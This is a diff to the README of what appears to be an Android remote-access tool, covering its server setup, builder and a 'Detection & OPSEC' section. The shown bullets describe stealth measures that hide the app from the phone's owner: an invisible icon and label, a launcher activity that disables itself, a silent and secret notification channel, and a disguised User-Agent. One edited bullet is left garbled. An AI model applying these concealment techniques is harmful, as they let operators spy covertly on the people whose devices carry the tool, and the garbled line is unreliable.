@@ -434,7 +434,7 @@ Requirements: a Linux build host (the builder pulls Linux JDK and SDK archives),
 
 **Server**
 
-Use the Android server, not the Windows or Linux one — it speaks a different protocol.
+Use the Android server, not the Windows or Linux one.
 
 1. Set `ENCRYPTION_KEY` at the top of `server.py` to exactly 16 characters.
 2. Start it:
@@ -463,44 +463,6 @@ The builder installs JDK 17 and the Android SDK into `/jdk17` and `/android-sdk`
 - `remove` sends an uninstall intent, so the operator still has to tap through the confirmation.
 
 </details>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 ## Detection & OPSEC
 
@@ -553,7 +515,7 @@ The builder installs JDK 17 and the Android SDK into `/jdk17` and `/android-sdk`
 
 **Anonymisation**
 - Icon and label are transparent and empty; after first launch `MainActivity` disables itself and the app leaves the drawer entirely.
-- Notification channel is `IMPORTANCE_MIN`, `VISIBILITY_SECRET`, no sound, no vibration, no badge — collapsed under "silent" if noticed at all.
+- Notification channel is `IMPORTANCE_MIN`, `VISIBILITY_SECRET`, no sound, no vibration having no badge collapsed under "silent".
 - `okhttp/4.9.0` User-Agent.
 
 **Anti-exploitation**
